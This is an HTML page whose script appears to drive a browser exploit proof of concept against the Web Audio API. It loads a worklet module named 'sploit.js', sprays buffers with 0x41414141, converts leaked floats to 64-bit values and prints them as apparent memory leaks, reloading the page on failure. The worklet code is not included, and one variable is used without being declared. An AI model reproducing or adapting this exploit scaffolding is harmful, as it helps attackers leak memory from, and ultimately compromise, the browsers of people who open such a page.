<body></body>
<pre id='log' style="font-size : 40px;"></pre>
<script>
/*if(document.location.protocol !== "https:") {
	document.location.protocol = "https:"
}
*/

function print(str) {
            var log = document.getElementById('log');
            alert(str);
            if (log) {
                log.innerText += "[+] "+str + '\n';
            }
        }
let data_view = new DataView(new ArrayBuffer(8));

floatAsQword = float => {
            data_view.setFloat64(0, float, true);
            var low = data_view.getUint32(0, true);
            var high = data_view.getUint32(4, true);
            return low + high * 0x100000000;
}

qwordAsFloat = qword => {
            data_view.setUint32(0, qword%0x100000000, true);
            data_view.setUint32(4, qword/0x100000000, true);
            //data_view.setBigUint64(0, qword);
            return data_view.getFloat64(0);
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function main(){

let audioCtx = new OfflineAudioContext({numberOfChannels: 1, length: 0x100000, sampleRate: 44100});
            
let outputBufferSrc = new ConvolverNode(audioCtx);
let inputBufferSrc = new AudioBufferSourceNode(audioCtx);
let outputBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
let inputBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
            
outputBufferSrc.buffer = outputBuffer;
inputBufferSrc.loop = true;
inputBufferSrc.buffer = inputBuffer;
let outputBufferU32 = new Uint32Array(outputBuffer.getChannelData(0).buffer);
let inputBufferU32 = new Uint32Array(inputBuffer.getChannelData(0).buffer);
            
inputBufferU32.fill(0x41414141);

await audioCtx.audioWorklet.addModule("sploit.js");

let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
let originNode2 = new AudioWorkletNode(audioCtx, 'OrigineWorklet2',{numberOfInputs:0, numberOfOutputs:1});
            //return 0;
let source = new AudioBufferSourceNode(audioCtx);
let myArrayBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
await sleep(500);
            //alert();
var is_leak = 0;
//var is_leak1 = false;
originNode2.port.onmessage = async (e)=>{
    if(e.data == "retry"){
	    print("failed");
                    //print(e.data);
                    //await sleep(2000);
        location.reload();
        return;
    }
    if(!is_leak1){
                    //console.log(e.data.toString(16));
        print(e.data);
        return;
    }
                
var leak = e.data;
                
for(var i = 0; i < leak.length; i ++){
    if(leak[i] != 0)
    print(`[${i}] : ` + floatAsQword(leak[i]).toString(16));
}

is_leak++;
//print(e.data);

                //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
                //console.log("suspend");
}
            //
originNode.connect(audioCtx.destination);
            /*
            inputBufferSrc.connect(originNode)
            .connect(outputBufferSrc)
            .connect(audioCtx.destination);
            */
            //originNode2.connect(audioCtx.destination);
await audioCtx.startRendering();
}
            
main();
</script>
